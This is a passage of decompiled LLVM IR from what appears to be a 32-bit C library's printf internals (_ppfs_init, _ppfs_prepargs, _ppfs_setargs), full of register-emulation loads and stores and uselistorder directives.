  %v10_804ed11 = icmp slt i32 %v1_804ed11, 0
  store i1 %v10_804ed11, i1* %sf.global-to-local, align 1
  ret i32 %v2_804ed0e

; uselistorder directives
  uselistorder i32 %v1_804ecff, { 1, 2, 0 }
  uselistorder i32 %v3_804ecf4, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ecd9, { 1, 0 }
  uselistorder i32 %v2_804ecd3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ecb2, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804ecad, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804ec8d, { 1, 0 }
  uselistorder i32 %v0_804ec86.pre, { 1, 0 }
  uselistorder i32 %v0_804ec59, { 1, 0 }
  uselistorder i32 %v3_804ec4d, { 1, 0 }
  uselistorder i32 %v0_804ec42, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804ec1a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ebf3, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804ebdb, { 1, 0 }
  uselistorder i32 %v2_804ebc7, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804ebb4, { 1, 0 }
  uselistorder i32 %v1_804ebb1, { 1, 0 }
  uselistorder i32 %v1_804eba7, { 1, 0 }
  uselistorder i32 %v0_804eba7, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804eb86, { 1, 0 }
  uselistorder i32 %v1_804eb63, { 1, 0 }
  uselistorder i32 %v1_804eb21, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804eb3d, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804eb06, { 1, 0 }
  uselistorder i32 %v1_804eaf1, { 1, 0 }
  uselistorder i32 %v1_804eabd, { 1, 0 }
  uselistorder i32 %v0_804ea97, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804ea7d, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804ea69, { 1, 0 }
  uselistorder i32 %v1_804ea1f, { 1, 0 }
  uselistorder i32 %v4_804e9ed, { 1, 0 }
  uselistorder i32 %v0_804e9e2, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e9dd, { 1, 0 }
  uselistorder i32 %v0_804ea16, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e9cd, { 1, 0 }
  uselistorder i32 %v1_804e9c4, { 1, 0 }
  uselistorder i32 %v1_804e9b8, { 1, 0 }
  uselistorder i32 %v3_804e9ac, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e9a2, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e99d, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804e99b, { 1, 0 }
  uselistorder i32 %v0_804e9ed, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e9dd, { 1, 2, 0 }
  uselistorder i32 %v3_804e975, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804e963, { 1, 0 }
  uselistorder i32 %v4_804e95a, { 1, 0 }
  uselistorder i32 %v3_804e95a, { 1, 0 }
  uselistorder i32 %v6_804e952, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804e923, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804e922, { 2, 1, 0 }
  uselistorder i32 %v1_804e8fb, { 1, 0 }
  uselistorder i32 %v1_804e8ef, { 1, 0 }
  uselistorder i32 %v1_804e8ea, { 1, 0 }
  uselistorder i32 %v2_804e8e2, { 1, 0 }
  uselistorder i32 %tmp69, { 1, 0 }
  uselistorder i32 %v3_804e8cc, { 1, 0, 2 }
  uselistorder i8 %v3_804e8bb, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e8b2, { 1, 0 }
  uselistorder i32 %v3_804e884, { 13, 12, 9, 14, 15, 7, 8, 3, 2, 16, 6, 0, 10, 11, 1, 4, 5, 17, 18, 19 }
  uselistorder i32 %v0_804e884.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e880, { 1, 0 }
  uselistorder i32 %v1_804e880.pre, { 1, 0 }
  uselistorder i32 %v1_804e87f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e87c, { 1, 0 }
  uselistorder i32 %v2_804e88073, { 1, 0 }
  uselistorder i32 %v3_804e866, { 1, 0 }
  uselistorder i8 %v4_804e822, { 1, 0 }
  uselistorder i32 %v1_804e822, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804e819, { 1, 0 }
  uselistorder i32 %v2_804e7ee, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804e7ea, { 1, 0 }
  uselistorder i8 %v2_804e7e4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e7f2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e7d4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 7, 0, 6, 5, 1, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 63, 62, 0, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ed0e, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ed07, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804eccf, { 1, 0 }
  uselistorder label %dec_label_pc_804ec86, { 1, 0 }
  uselistorder label %dec_label_pc_804ec6f, { 1, 0 }
  uselistorder label %dec_label_pc_804ec1a, { 1, 0 }
  uselistorder label %dec_label_pc_804ebec, { 1, 0 }
  uselistorder label %dec_label_pc_804ebd1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebbb, { 1, 0 }
  uselistorder label %dec_label_pc_804eba7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eba2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eb34, { 1, 0 }
  uselistorder label %dec_label_pc_804eb1a, { 1, 0 }
  uselistorder label %dec_label_pc_804ea38, { 1, 0 }
  uselistorder label %dec_label_pc_804e9dd, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804e98b, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e93b, { 1, 0 }
  uselistorder label %dec_label_pc_804e922, { 1, 0 }
  uselistorder label %dec_label_pc_804e90e, { 1, 0 }
  uselistorder label %dec_label_pc_804e909, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e8ea, { 1, 0 }
  uselistorder label %dec_label_pc_804e875, { 1, 0 }
  uselistorder label %dec_label_pc_804e86d, { 1, 0 }
  uselistorder label %dec_label_pc_804e819, { 1, 0 }
  uselistorder label %dec_label_pc_804e80e, { 1, 0 }
  uselistorder label %dec_label_pc_804e7e4.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ed1c = load i32, i32* @esi, align 4
  %v0_804ed1d = load i32, i32* @ebx, align 4
  store i32 %v0_804ed1d, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ed31 = bitcast i32* %arg1 to i8*
  %v4_804ed31 = call i32 @__GI_memset(i8* %v3_804ed31, i32 0, i32 188)
  %v0_804ed36 = load i32, i32* @ebx, align 4
  %v1_804ed36 = add i32 %v0_804ed36, 40
  store i32 %v1_804ed36, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804ed3e = add i32 %v0_804ed36, 24
  %v2_804ed3e = inttoptr i32 %v1_804ed3e to i32*
  %v3_804ed3e = load i32, i32* %v2_804ed3e, align 4
  %v4_804ed3e = add i32 %v3_804ed3e, -1
  store i32 %v4_804ed3e, i32* %v2_804ed3e, align 4
  %v0_804ed44 = load i32, i32* @esi, align 4
  %v1_804ed44 = load i32, i32* @ebx, align 4
  %v2_804ed44 = inttoptr i32 %v1_804ed44 to i32*
  store i32 %v0_804ed44, i32* %v2_804ed44, align 4
  %v0_804ed46.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed46

dec_label_pc_804ed46:                             ; preds = %dec_label_pc_804ed46, %entry
  %v0_804ed46 = phi i32 [ %v1_804ed4c, %dec_label_pc_804ed46 ], [ %v0_804ed46.pre, %entry ]
  %v1_804ed46 = inttoptr i32 %v0_804ed46 to i32*
  store i32 8, i32* %v1_804ed46, align 4
  %v0_804ed4c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed4c = add i32 %v0_804ed4c, 4
  store i32 %v1_804ed4c, i32* %eax.global-to-local, align 4
  %v0_804ed4f = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed4f = add i32 %v0_804ed4f, -1
  %v8_804ed4f = icmp eq i32 %v1_804ed4f, 0
  store i32 %v1_804ed4f, i32* %edx.global-to-local, align 4
  %v1_804ed50 = icmp eq i1 %v8_804ed4f, false
  br i1 %v1_804ed50, label %dec_label_pc_804ed46, label %dec_label_pc_804ed52

dec_label_pc_804ed52:                             ; preds = %dec_label_pc_804ed46
  %v0_804ed52 = load i32, i32* @esi, align 4
  store i32 %v0_804ed52, i32* %eax.global-to-local, align 4
  %v1_804ed7d20 = inttoptr i32 %v0_804ed52 to i8*
  %v2_804ed7d21 = load i8, i8* %v1_804ed7d20, align 1
  %v3_804ed7d22 = zext i8 %v2_804ed7d21 to i32
  %v5_804ed7d23 = and i32 %v1_804ed4f, -256
  %v6_804ed7d24 = or i32 %v3_804ed7d22, %v5_804ed7d23
  store i32 %v6_804ed7d24, i32* %edx.global-to-local, align 4
  %v4_804ed7f25 = icmp eq i8 %v2_804ed7d21, 0
  %v1_804ed8127 = icmp eq i1 %v4_804ed7f25, false
  br i1 %v1_804ed8127, label %dec_label_pc_804ed5b, label %dec_label_pc_804ed83

dec_label_pc_804ed5b:                             ; preds = %dec_label_pc_804ed52, %dec_label_pc_804ed7d.backedge
  %v6_804ed7d30 = phi i32 [ %v6_804ed7d, %dec_label_pc_804ed7d.backedge ], [ %v6_804ed7d24, %dec_label_pc_804ed52 ]
  %v2_804ed7d29 = phi i8 [ %v2_804ed7d, %dec_label_pc_804ed7d.backedge ], [ %v2_804ed7d21, %dec_label_pc_804ed52 ]
  %v0_804ed6028 = phi i32 [ %v0_804ed60.be, %dec_label_pc_804ed7d.backedge ], [ %v0_804ed52, %dec_label_pc_804ed52 ]
  %v10_804ed5b = icmp eq i8 %v2_804ed7d29, 37
  %v1_804ed5e = icmp eq i1 %v10_804ed5b, false
  br i1 %v1_804ed5e, label %dec_label_pc_804ed7c, label %dec_label_pc_804ed60

dec_label_pc_804ed60:                             ; preds = %dec_label_pc_804ed5b
  %v1_804ed60 = add i32 %v0_804ed6028, 1
  store i32 %v1_804ed60, i32* %eax.global-to-local, align 4
  %v1_804ed61 = inttoptr i32 %v1_804ed60 to i8*
  %v2_804ed61 = load i8, i8* %v1_804ed61, align 1
  %v11_804ed61 = icmp eq i8 %v2_804ed61, 37
  br i1 %v11_804ed61, label %dec_label_pc_804ed7c, label %dec_label_pc_804ed66

dec_label_pc_804ed66:                             ; preds = %dec_label_pc_804ed60
  %v1_804ed69 = load i32, i32* @ebx, align 4
  %v2_804ed69 = inttoptr i32 %v1_804ed69 to i32*
  store i32 %v1_804ed60, i32* %v2_804ed69, align 4
  %v0_804ed6b = load i32, i32* @ebx, align 4
  %v1_804ed6c = inttoptr i32 %v0_804ed6b to i32*
  %v2_804ed6c = call i32 @_ppfs_parsespec(i32* %v1_804ed6c)
  store i32 %v2_804ed6c, i32* %eax.global-to-local, align 4
  %v2_804ed74 = icmp slt i32 %v2_804ed6c, 0
  br i1 %v2_804ed74, label %dec_label_pc_804ed87, label %dec_label_pc_804ed78

dec_label_pc_804ed78:                             ; preds = %dec_label_pc_804ed66
  %v0_804ed78 = load i32, i32* @ebx, align 4
  %v1_804ed78 = inttoptr i32 %v0_804ed78 to i32*
  %v2_804ed78 = load i32, i32* %v1_804ed78, align 4
  %v4_804ed7d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ed7d.backedge

dec_label_pc_804ed7c:                             ; preds = %dec_label_pc_804ed60, %dec_label_pc_804ed5b
  %v0_804ed7c = phi i32 [ %v1_804ed60, %dec_label_pc_804ed60 ], [ %v0_804ed6028, %dec_label_pc_804ed5b ]
  %v1_804ed7c = add i32 %v0_804ed7c, 1
  br label %dec_label_pc_804ed7d.backedge

dec_label_pc_804ed7d.backedge:                    ; preds = %dec_label_pc_804ed7c, %dec_label_pc_804ed78
  %v4_804ed7d.be = phi i32 [ %v4_804ed7d.pre.pre, %dec_label_pc_804ed78 ], [ %v6_804ed7d30, %dec_label_pc_804ed7c ]
  %v0_804ed60.be = phi i32 [ %v2_804ed78, %dec_label_pc_804ed78 ], [ %v1_804ed7c, %dec_label_pc_804ed7c ]
  store i32 %v0_804ed60.be, i32* %eax.global-to-local, align 4
  %v1_804ed7d = inttoptr i32 %v0_804ed60.be to i8*
  %v2_804ed7d = load i8, i8* %v1_804ed7d, align 1
  %v3_804ed7d = zext i8 %v2_804ed7d to i32
  %v5_804ed7d = and i32 %v4_804ed7d.be, -256
  %v6_804ed7d = or i32 %v3_804ed7d, %v5_804ed7d
  store i32 %v6_804ed7d, i32* %edx.global-to-local, align 4
  %v4_804ed7f = icmp eq i8 %v2_804ed7d, 0
  %v1_804ed81 = icmp eq i1 %v4_804ed7f, false
  br i1 %v1_804ed81, label %dec_label_pc_804ed5b, label %dec_label_pc_804ed7d.dec_label_pc_804ed83_crit_edge

dec_label_pc_804ed7d.dec_label_pc_804ed83_crit_edge: ; preds = %dec_label_pc_804ed7d.backedge
  %v0_804ed83.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ed83

dec_label_pc_804ed83:                             ; preds = %dec_label_pc_804ed7d.dec_label_pc_804ed83_crit_edge, %dec_label_pc_804ed52
  %v0_804ed83 = phi i32 [ %v0_804ed83.pre, %dec_label_pc_804ed7d.dec_label_pc_804ed83_crit_edge ], [ %v0_804ed52, %dec_label_pc_804ed52 ]
  %v1_804ed83 = load i32, i32* @ebx, align 4
  %v2_804ed83 = inttoptr i32 %v1_804ed83 to i32*
  store i32 %v0_804ed83, i32* %v2_804ed83, align 4
  br label %dec_label_pc_804ed87

dec_label_pc_804ed87:                             ; preds = %dec_label_pc_804ed66, %dec_label_pc_804ed83
  %storemerge = phi i32 [ 0, %dec_label_pc_804ed83 ], [ -1, %dec_label_pc_804ed66 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804ed87 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ed87, i32* @edx, align 4
  %v2_804ed88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ed88, i32* @ebx, align 4
  store i32 %v0_804ed1c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804ed7d, { 1, 0 }
  uselistorder i8 %v2_804ed7d, { 1, 2, 0 }
  uselistorder i32 %v0_804ed60.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ed6028, { 1, 0 }
  uselistorder i32 %v0_804ed52, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ed4f, { 0, 2, 1 }
  uselistorder i32 %v1_804ed4c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804ed87, { 1, 0 }
  uselistorder label %dec_label_pc_804ed5b, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ed8c = load i32, i32* @esi, align 4
  %v0_804ed8d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ed99 = add i32 %arg1, 24
  %v2_804ed99 = inttoptr i32 %v1_804ed99 to i32*
  %v3_804ed99 = load i32, i32* %v2_804ed99, align 4
  %v2_804ed9c = add i32 %arg1, 76
  %v3_804ed9c = inttoptr i32 %v2_804ed9c to i32*
  store i32 %arg2, i32* %v3_804ed9c, align 4
  %tmp8 = icmp slt i32 %v3_804ed99, 1
  br i1 %tmp8, label %dec_label_pc_804edca, label %dec_label_pc_804eda3

dec_label_pc_804eda3:                             ; preds = %entry
  %v1_804eda6 = load i32, i32* @ebx, align 4
  %v2_804eda6 = add i32 %v1_804eda6, 28
  %v3_804eda6 = inttoptr i32 %v2_804eda6 to i32*
  store i32 %v3_804ed99, i32* %v3_804eda6, align 4
  %v0_804eda9 = load i32, i32* @ebx, align 4
  %v1_804eda9 = add i32 %v0_804eda9, 24
  %v2_804eda9 = inttoptr i32 %v1_804eda9 to i32*
  store i32 0, i32* %v2_804eda9, align 4
  %v0_804edb0 = load i32, i32* @ebx, align 4
  %v1_804edb0 = add i32 %v0_804edb0, 4
  %v2_804edb0 = inttoptr i32 %v1_804edb0 to i32*
  store i32 0, i32* %v2_804edb0, align 4
  %v0_804edb7 = load i32, i32* @ebx, align 4
  %v1_804edb7 = add i32 %v0_804edb7, 8
  %v2_804edb7 = inttoptr i32 %v1_804edb7 to i32*
  store i32 0, i32* %v2_804edb7, align 4
  %v0_804edbe = load i32, i32* @ebx, align 4
  %v1_804edbf = call i32 @_ppfs_setargs(i32 %v0_804edbe)
  %v1_804edc7 = load i32, i32* @ebx, align 4
  %v2_804edc7 = add i32 %v1_804edc7, 24
  %v3_804edc7 = inttoptr i32 %v2_804edc7 to i32*
  store i32 %v3_804ed99, i32* %v3_804edc7, align 4
  br label %dec_label_pc_804edca

dec_label_pc_804edca:                             ; preds = %entry, %dec_label_pc_804eda3
  %v2_804edca = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ed8d, i32* @ebx, align 4
  store i32 %v0_804ed8c, i32* @esi, align 4
  ret i32 %v2_804edca

; uselistorder directives
  uselistorder i32 %v3_804ed99, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804edca, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804edd1 = load i32, i32* @ebx, align 4
  store i32 %v0_804edd1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804edd6 = add i32 %arg1, 24
  %v2_804edd6 = inttoptr i32 %v1_804edd6 to i32*
  %v3_804edd6 = load i32, i32* %v2_804edd6, align 4
  %v4_804edd6 = icmp eq i32 %v3_804edd6, 0
  %v1_804edda = add i32 %arg1, 80
  store i32 %v1_804edda, i32* %ebx.global-to-local, align 4
  %v1_804eddd = icmp eq i1 %v4_804edd6, false
  %v1_804ee95 = add i32 %arg1, 8
  %v2_804ee95 = inttoptr i32 %v1_804ee95 to i32*
  %v3_804ee95 = load i32, i32* %v2_804ee95, align 4
  %v8_804ee95 = icmp eq i32 %v3_804ee95, -2147483648
  %v1_804ee9c = icmp eq i1 %v8_804ee95, false
  br i1 %v1_804eddd, label %dec_label_pc_804ee95, label %dec_label_pc_804ede3

dec_label_pc_804ede3:                             ; preds = %entry
  br i1 %v1_804ee9c, label %dec_label_pc_804edfd, label %dec_label_pc_804edec

dec_label_pc_804edec:                             ; preds = %dec_label_pc_804ede3
  %v1_804edec = add i32 %arg1, 76
  %v2_804edec = inttoptr i32 %v1_804edec to i32*
  %v3_804edec = load i32, i32* %v2_804edec, align 4
  store i32 %v3_804edec, i32* %eax.global-to-local, align 4
  %v1_804edef = add i32 %v3_804edec, 4
  store i32 %v1_804edef, i32* %edx.global-to-local, align 4
  store i32 %v1_804edef, i32* %v2_804edec, align 4
  %v0_804edf5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edf5 = inttoptr i32 %v0_804edf5 to i32*
  %v2_804edf5 = load i32, i32* %v1_804edf5, align 4
  store i32 %v2_804edf5, i32* %eax.global-to-local, align 4
  %v1_804edf7 = load i32, i32* @ecx, align 4
  %v2_804edf7 = add i32 %v1_804edf7, 80
  %v3_804edf7 = inttoptr i32 %v2_804edf7 to i32*
  store i32 %v2_804edf5, i32* %v3_804edf7, align 4
  %v0_804edfa = load i32, i32* %eax.global-to-local, align 4
  %v1_804edfa = load i32, i32* @ecx, align 4
  %v2_804edfa = add i32 %v1_804edfa, 8
  %v3_804edfa = inttoptr i32 %v2_804edfa to i32*
  store i32 %v0_804edfa, i32* %v3_804edfa, align 4
  %v0_804edfd.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804edfd

dec_label_pc_804edfd:                             ; preds = %dec_label_pc_804ede3, %dec_label_pc_804edec
  %v1_804ee0c = phi i32 [ %arg1, %dec_label_pc_804ede3 ], [ %v0_804edfd.pre, %dec_label_pc_804edec ]
  %v1_804edfd = add i32 %v1_804ee0c, 4
  %v2_804edfd = inttoptr i32 %v1_804edfd to i32*
  %v3_804edfd = load i32, i32* %v2_804edfd, align 4
  %v8_804edfd = icmp eq i32 %v3_804edfd, -2147483648
  %v1_804ee04 = icmp eq i1 %v8_804edfd, false
  br i1 %v1_804ee04, label %dec_label_pc_804ee17, label %dec_label_pc_804ee06

dec_label_pc_804ee06:                             ; preds = %dec_label_pc_804edfd
  %v1_804ee06 = add i32 %v1_804ee0c, 76
  %v2_804ee06 = inttoptr i32 %v1_804ee06 to i32*
  %v3_804ee06 = load i32, i32* %v2_804ee06, align 4
  store i32 %v3_804ee06, i32* %eax.global-to-local, align 4
  %v1_804ee09 = add i32 %v3_804ee06, 4
  store i32 %v1_804ee09, i32* %edx.global-to-local, align 4
  store i32 %v1_804ee09, i32* %v2_804ee06, align 4
  %v0_804ee0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee0f = inttoptr i32 %v0_804ee0f to i32*
  %v2_804ee0f = load i32, i32* %v1_804ee0f, align 4
  store i32 %v2_804ee0f, i32* %eax.global-to-local, align 4
  %v1_804ee11 = load i32, i32* @ecx, align 4
  %v2_804ee11 = add i32 %v1_804ee11, 80
  %v3_804ee11 = inttoptr i32 %v2_804ee11 to i32*
  store i32 %v2_804ee0f, i32* %v3_804ee11, align 4
  %v0_804ee14 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee14 = load i32, i32* @ecx, align 4
  %v2_804ee14 = add i32 %v1_804ee14, 4
  %v3_804ee14 = inttoptr i32 %v2_804ee14 to i32*
  store i32 %v0_804ee14, i32* %v3_804ee14, align 4
  %v1_804ee8e15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ee17

dec_label_pc_804ee17:                             ; preds = %dec_label_pc_804edfd, %dec_label_pc_804ee06
  %v1_804ee8e15 = phi i32 [ %v1_804ee0c, %dec_label_pc_804edfd ], [ %v1_804ee8e15.pre, %dec_label_pc_804ee06 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804ee8e16 = add i32 %v1_804ee8e15, 28
  %v3_804ee8e17 = inttoptr i32 %v2_804ee8e16 to i32*
  %v4_804ee8e18 = load i32, i32* %v3_804ee8e17, align 4
  %v5_804ee9120 = icmp sgt i32 %v4_804ee8e18, 0
  br i1 %v5_804ee9120, label %dec_label_pc_804ee1b, label %dec_label_pc_804eec3.loopexit

dec_label_pc_804ee1b:                             ; preds = %dec_label_pc_804ee17, %dec_label_pc_804ee8d
  %v1_804ee8e22 = phi i32 [ %v1_804ee8e, %dec_label_pc_804ee8d ], [ %v1_804ee8e15, %dec_label_pc_804ee17 ]
  %v1_804ee1b21 = phi i32 [ %v1_804ee8d, %dec_label_pc_804ee8d ], [ 0, %dec_label_pc_804ee17 ]
  %v2_804ee1b = mul i32 %v1_804ee1b21, 4
  %v3_804ee1b = add i32 %v2_804ee1b, 40
  %v4_804ee1b = add i32 %v3_804ee1b, %v1_804ee8e22
  %v5_804ee1b = inttoptr i32 %v4_804ee1b to i32*
  %v6_804ee1b = load i32, i32* %v5_804ee1b, align 4
  store i32 %v6_804ee1b, i32* %eax.global-to-local, align 4
  %v1_804ee1f = add i32 %v6_804ee1b, -8
  %v9_804ee1f = icmp eq i32 %v1_804ee1f, 0
  br i1 %v9_804ee1f, label %dec_label_pc_804ee8d, label %dec_label_pc_804ee24

dec_label_pc_804ee24:                             ; preds = %dec_label_pc_804ee1b
  %v10_804ee1f = icmp slt i32 %v1_804ee1f, 0
  %v6_804ee1f = sub i32 7, %v6_804ee1b
  %v7_804ee1f = and i32 %v6_804ee1f, %v6_804ee1b
  %v8_804ee1f = icmp slt i32 %v7_804ee1f, 0
  %v1_804ee24 = add i32 %v1_804ee8e22, 76
  %v2_804ee24 = inttoptr i32 %v1_804ee24 to i32*
  %v3_804ee24 = load i32, i32* %v2_804ee24, align 4
  store i32 %v3_804ee24, i32* %edx.global-to-local, align 4
  %v3_804ee27 = icmp eq i1 %v10_804ee1f, %v8_804ee1f
  br i1 %v3_804ee27, label %dec_label_pc_804ee37, label %dec_label_pc_804ee29

dec_label_pc_804ee29:                             ; preds = %dec_label_pc_804ee24
  %tmp13 = icmp slt i32 %v6_804ee1b, 3
  %v9_804ee30 = icmp eq i32 %v6_804ee1b, 7
  %v1_804ee33 = icmp eq i1 %v9_804ee30, false
  %or.cond = or i1 %tmp13, %v1_804ee33
  br i1 %or.cond, label %dec_label_pc_804ee80, label %dec_label_pc_804ee62

dec_label_pc_804ee37:                             ; preds = %dec_label_pc_804ee24
  %tmp14 = icmp sgt i32 %v6_804ee1b, 1024
  br i1 %tmp14, label %dec_label_pc_804ee40, label %dec_label_pc_804ee80

dec_label_pc_804ee40:                             ; preds = %dec_label_pc_804ee37
  %v6_804ee40 = icmp eq i32 %v6_804ee1b, 2048
  br i1 %v6_804ee40, label %dec_label_pc_804ee50, label %dec_label_pc_804ee47

dec_label_pc_804ee47:                             ; preds = %dec_label_pc_804ee40
  %v9_804ee47 = icmp eq i32 %v6_804ee1b, 2055
  %v1_804ee4c = icmp eq i1 %v9_804ee47, false
  br i1 %v1_804ee4c, label %dec_label_pc_804ee80, label %dec_label_pc_804ee71

dec_label_pc_804ee50:                             ; preds = %dec_label_pc_804ee40
  %v1_804ee50 = add i32 %v3_804ee24, 8
  store i32 %v1_804ee50, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee50, i32* %v2_804ee24, align 4
  %v0_804ee56 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee56 = inttoptr i32 %v0_804ee56 to i32*
  %v2_804ee56 = load i32, i32* %v1_804ee56, align 4
  store i32 %v2_804ee56, i32* %eax.global-to-local, align 4
  %v1_804ee58 = add i32 %v0_804ee56, 4
  %v2_804ee58 = inttoptr i32 %v1_804ee58 to i32*
  %v3_804ee58 = load i32, i32* %v2_804ee58, align 4
  store i32 %v3_804ee58, i32* %edx.global-to-local, align 4
  %v1_804ee5b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee5b = inttoptr i32 %v1_804ee5b to i32*
  store i32 %v2_804ee56, i32* %v2_804ee5b, align 4
  %v0_804ee5d = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee5d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee5d = add i32 %v1_804ee5d, 4
  %v3_804ee5d = inttoptr i32 %v2_804ee5d to i32*
  store i32 %v0_804ee5d, i32* %v3_804ee5d, align 4
  br label %dec_label_pc_804ee8a

dec_label_pc_804ee62:                             ; preds = %dec_label_pc_804ee29
  %v3_804ee62 = load i32, i32* %v2_804ee24, align 4
